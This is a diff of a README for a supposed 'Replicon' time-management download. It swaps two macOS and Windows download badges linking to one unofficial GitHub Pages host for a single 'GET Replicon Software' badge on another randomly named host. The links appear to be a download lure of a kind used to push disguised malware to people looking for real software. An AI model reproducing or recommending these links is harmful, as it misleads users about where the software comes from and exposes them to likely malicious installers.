@@ -1,18 +1,7 @@
 # Replicon Download — Time Management Platform
 
-<a href="https://io-app-git.github.io/.github/?offer=Replicon" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Replicon%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Replicon for macOS">
-</a>
+[![GET Replicon Software](https://img.shields.io/badge/GET%20%E2%80%94%20Replicon-Software-0078D6?style=for-the-badge&logoColor=white)](https://ezonthahazranna.github.io/.github/Replicon-Software)
 
-<a href="https://io-app-git.github.io/.github/?offer=Replicon" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Replicon%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Replicon for Windows">
-</a>
 
 ---
 
